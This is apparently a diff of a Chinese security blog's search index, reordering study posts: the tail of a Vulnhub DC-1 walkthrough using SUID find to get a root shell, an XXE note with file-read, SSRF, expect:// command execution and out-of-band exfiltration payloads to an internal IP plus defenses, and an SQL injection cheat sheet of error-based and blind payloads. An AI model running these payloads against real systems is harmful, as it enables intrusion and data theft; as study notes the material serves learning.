-<p>可以看到find命令有SUID权限，因此我们可以用find进行提权</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/33.png" alt></p>
-<blockquote>
-<p>常见的可以用来提权的程序有：nmap、vim、find、bash、more、less、nano、cp</p>
-</blockquote>
-<p>find提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find robots.txt -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
-<p>中间的robots.txt是一个能够找到的文件或者目录，否则可能会出错，执行了这个命令之后就可以看到权限提升到了root</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/34.png" alt></p>
-<p>然后再进入root目录就能看到最后一个flag的位置了</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/35.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_44276741/article/details/122365853">【Vulnhub-DC1】DC-1</a></p>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123433375?spm=1001.2014.3001.5501">dc-1 靶机渗透学习</a></p>
-<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
-<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
-<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
-<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1154,66 +1154,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XXE</title>
-    <url>/2022/06/02/XXE/</url>
-    <content><![CDATA[<h1 id="一、XML与XXE"><a href="#一、XML与XXE" class="headerlink" title="一、XML与XXE"></a>一、XML与XXE</h1><blockquote>
-<p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。<strong>XXE漏洞全称XMLExternal Entity Injection</strong>，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
-</blockquote>
-<h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><ol>
-<li><p>读文件：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>内网探针或攻击内网应用（触发漏洞地址）</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>RCE</p>
-<p>该CASE是在安装expect扩展的PHP环境里执行系统命令</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>引入外部实体dtd</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>无回显，读取文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%dtd;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">	&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.8.232/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>协议-读文件（绕过姿势）</p>
-<ul>
-<li><p>ENTITY，SYSTEM，file等关键词被过滤</p>
-<p>使用编码方式绕过：UTF-16BE</p>
-<p><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p>
-</li>
-<li><p>如果http被过滤，则可以</p>
-<ol>
-<li><p>data://协议绕过</p>
-</li>
-<li><p>file://协议加文件上传</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	&lt;ENTITY a SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://192.168.8.232/test.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>php://filter协议加文件上传</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;xxe;</span> </span><br><span class="line">	<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-<h1 id="二、防御方案"><a href="#二、防御方案" class="headerlink" title="二、防御方案"></a>二、防御方案</h1><ol>
-<li><p>禁用外部实体</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance（）;dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml import etreexmlData=etree.parse (xmlSource,etree.XMLParser(resolve_entities=False)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>过滤用户提交的xml数据</p>
-<p>过滤关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code></p>
-</li>
-<li><p>WAF产品</p>
-</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
     <title>WinDbg使用学习</title>
     <url>/2022/07/29/WinDbg%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="一、安装WinDbg"><a href="#一、安装WinDbg" class="headerlink" title="一、安装WinDbg"></a>一、安装WinDbg</h1><p>Microsoft商店中下载安装即可，默认安装路径</p>
@@ -1698,6 +1638,66 @@
         <tag>learn</tag>
         <tag>调试</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>XXE</title>
+    <url>/2022/06/02/XXE/</url>
+    <content><![CDATA[<h1 id="一、XML与XXE"><a href="#一、XML与XXE" class="headerlink" title="一、XML与XXE"></a>一、XML与XXE</h1><blockquote>
+<p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。<strong>XXE漏洞全称XMLExternal Entity Injection</strong>，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+</blockquote>
+<h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><ol>
+<li><p>读文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内网探针或攻击内网应用（触发漏洞地址）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RCE</p>
+<p>该CASE是在安装expect扩展的PHP环境里执行系统命令</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>引入外部实体dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>无回显，读取文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%dtd;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">	&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.8.232/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>协议-读文件（绕过姿势）</p>
+<ul>
+<li><p>ENTITY，SYSTEM，file等关键词被过滤</p>
+<p>使用编码方式绕过：UTF-16BE</p>
+<p><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p>
+</li>
+<li><p>如果http被过滤，则可以</p>
+<ol>
+<li><p>data://协议绕过</p>
+</li>
+<li><p>file://协议加文件上传</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	&lt;ENTITY a SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://192.168.8.232/test.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php://filter协议加文件上传</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;xxe;</span> </span><br><span class="line">	<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="二、防御方案"><a href="#二、防御方案" class="headerlink" title="二、防御方案"></a>二、防御方案</h1><ol>
+<li><p>禁用外部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance（）;dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml import etreexmlData=etree.parse (xmlSource,etree.XMLParser(resolve_entities=False)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤用户提交的xml数据</p>
+<p>过滤关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code></p>
+</li>
+<li><p>WAF产品</p>
+</li>
+</ol>
+]]></content>
   </entry>
   <entry>
     <title>求斜渐近线</title>
@@ -2350,6 +2350,55 @@
       </tags>
   </entry>
   <entry>
+    <title>sql注入</title>
+    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
+    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
+<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
+<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
+<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
+<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
+<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
+<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
+<p><strong>注入流程</strong>：</p>
+<ul>
+<li>数据库长度</li>
+<li>数据库表的ascii</li>
+<li>数据库中表的个数</li>
+<li>数据库中其中一个表名的长度</li>
+<li>数据库中其中一个表名的ascii</li>
+<li>列名的数量</li>
+<li>列名的长度</li>
+<li>列名的ascii</li>
+<li>字段的数量</li>
+<li>字段内容的长度</li>
+<li>字段内容对应的ascii</li>
+</ul>
+<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
+<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
+<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
+<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
+<li><p>插入恶意数据</p>
+<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
+</li>
+<li><p>引用恶意数据</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
+</li>
+</ol>
+<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
+<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL简单手工注入</title>
     <url>/2022/01/08/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>题目是墨者里的一道入门题</p>
@@ -2393,55 +2442,6 @@
 <p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
 <p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
 <p>将密码用md5解密，登录成功后即可获得key</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入</title>
-    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
-    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
-<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
-<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
-<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
-<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
-<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
-<p><strong>注入流程</strong>：</p>
-<ul>
-<li>数据库长度</li>
-<li>数据库表的ascii</li>
-<li>数据库中表的个数</li>
-<li>数据库中其中一个表名的长度</li>
-<li>数据库中其中一个表名的ascii</li>
-<li>列名的数量</li>
-<li>列名的长度</li>
-<li>列名的ascii</li>
-<li>字段的数量</li>
-<li>字段内容的长度</li>
-<li>字段内容对应的ascii</li>
-</ul>
-<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
-<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
-<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
-<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
-<li><p>插入恶意数据</p>
-<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
-</li>
-<li><p>引用恶意数据</p>
-<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
-</li>
-</ol>
-<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
-<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -2657,50 +2657,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Failed to load resource</title>
